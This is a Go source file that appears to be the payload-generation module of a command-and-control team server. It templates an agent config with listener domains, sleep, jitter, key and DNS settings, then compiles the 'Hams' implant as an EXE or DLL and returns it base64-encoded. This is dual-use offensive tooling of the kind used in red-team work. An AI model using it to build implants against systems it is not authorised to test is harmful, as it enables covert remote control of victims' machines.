package support

import (
	"TeamServer/cryptography"
	"TeamServer/debug"
	"TeamServer/macro"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func GenerateNewPayload(OS, Type string, Listeners []string, DLLType string, FucntioName string) (string, string, error) {
	// Check if the requested type is an executable
	debug.Info("Generateing New Payload....")

	SessionID := RandStringRunes(3)
	err := SetupPayloadConfiguration(SessionID, Listeners)
	if err != nil {
		return "", "", fmt.Errorf("setup configration failed: %w", err)
	}
	// Define the make command to run
	if Type == "dll" {
		err := SetupDLLPayload(DLLType, FucntioName)
		if err != nil {
			return "", "", fmt.Errorf("setup DLL: %w", err)
		}
	}

	// Execute the make command
	err = CompilePayload(Type)
	if err != nil {
		return "", "", fmt.Errorf("make command failed: %w", err)
	}

	defer os.Remove("Agent/Include/Config.h")
	// If make succeeds, locate the binary
	payload, err := ReadPayload(Type)
	if err != nil {
		return "", "", fmt.Errorf("failed to read payload: %w", err)
	}
	return payload, SessionID, nil
}

func ReadPayload(Type string) (string, error) {
	var binPath string
	if Type == "exe" {
		binPath = filepath.Join("Agent/bin", "Hams.exe")
	} else if Type == "dll" {
		binPath = filepath.Join("Agent/bin", "Hams.dll")
	} else {
		return "", fmt.Errorf("unsupported payload type: %s", Type)
	}

	// Read the binary data from the file
	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		return "", fmt.Errorf("failed to read binary file: %w", err)
	}

	// Optionally, remove the payload file after reading
	defer os.Remove(binPath)

	// Encode the binary data to a base64 string
	payload := base64.StdEncoding.EncodeToString(binData)

	debug.Info("New Payload Generated Successfully")

	return payload, nil
}
func CompilePayload(Type string) error {
	// Choose the directory where the makefile is located
	makefileDir := "Agent/"

	var cmd *exec.Cmd

	if Type == "exe" {
		// Command to compile as an executable
		cmd = exec.Command("make", "-C", makefileDir)
	} else if Type == "dll" {
		// Command to compile as a DLL
		// Pass BUILD_TYPE=dll to the make command
		cmd = exec.Command("make", "-C", makefileDir, "BUILD_TYPE=dll")
	} else {
		// Handle unsupported types
		return fmt.Errorf("unsupported build type: %s", Type)
	}

	// Run the command
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("make command failed: %w", err)
	}

	return nil
}

func SetupDLLPayload(DLLType, FunctionName string) error {
	// Resolve the absolute path to ensure file access regardless of the current working directory
	ConfigPath, err := filepath.Abs("Agent/Include/Config.h")
	if err != nil {
		return fmt.Errorf("failed to resolve Config.h path: %w", err)
	}

	// Check if the file exists
	if _, err := os.Stat(ConfigPath); os.IsNotExist(err) {
		// File does not exist
		return fmt.Errorf("Config.h does not exist at path: %s", ConfigPath)
	}

	// Open the file in append mode
	file, err := os.OpenFile(ConfigPath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("failed to open Config.h: %w", err)
	}
	defer file.Close()

	// Append the #define DLL line
	if _, err := file.WriteString("#define DLL\n"); err != nil {
		return fmt.Errorf("failed to write DLL define: %w", err)
	}

	// If DLLType is EXPORT_FUNCTION, append the function name definition
	if DLLType == "EXPORT_FUNCTION" {
		if _, err := file.WriteString(fmt.Sprintf("#define ExportFunctionName %s\n", FunctionName)); err != nil {
			return fmt.Errorf("failed to write ExportFunctionName define: %w", err)
		}
	}

	return nil
}
func SetupPayloadConfiguration(SessionID string, Listeners []string) error {
	// Define path to the template config file and the new config file
	templateConfigPath := "Agent/Include/Config.conf"
	newConfigPath := "Agent/Include/Config.h"

	// Read the template configuration file
	templateConfig, err := ioutil.ReadFile(templateConfigPath)
	if err != nil {
		return fmt.Errorf("failed to read template configuration file: %w", err)
	}

	// Convert the read content to a string for manipulation
	configContents := string(templateConfig)

	// Replace placeholders with actual values

	domainsString, DomainsCount, err := GetDomainListeners(Listeners)
	if err != nil {
		return err
	}
	configContents = strings.Replace(configContents, "{DOMAINS_COUNT}", fmt.Sprint(DomainsCount), -1)
	configContents = strings.Replace(configContents, "{ENTER_DOMAINS}", domainsString, -1)
	configContents = strings.Replace(configContents, "{MAGIC_VALUE}", "\""+macro.Config.MagicValue+"\"", -1)
	configContents = strings.Replace(configContents, "{SLEEP}", fmt.Sprint(macro.Config.Sleep), -1)
	configContents = strings.Replace(configContents, "{JITTER}", fmt.Sprint(macro.Config.Jitter), -1)
	configContents = strings.Replace(configContents, "{KEY}", "\""+string(cryptography.Key)+"\"", -1)
	configContents = strings.Replace(configContents, "{SESSTION_TOKEN}", "\""+SessionID+"\"", -1)
	configContents = strings.Replace(configContents, "{DEFAULT_DNS}", "\""+macro.Config.DefaultDNSServer+"\"", -1)

	// Write the modified configuration to the new config file
	err = ioutil.WriteFile(newConfigPath, []byte(configContents), 0644)
	if err != nil {
		return fmt.Errorf("failed to write new configuration file: %w", err)
	}

	// GOOD
	return nil
}
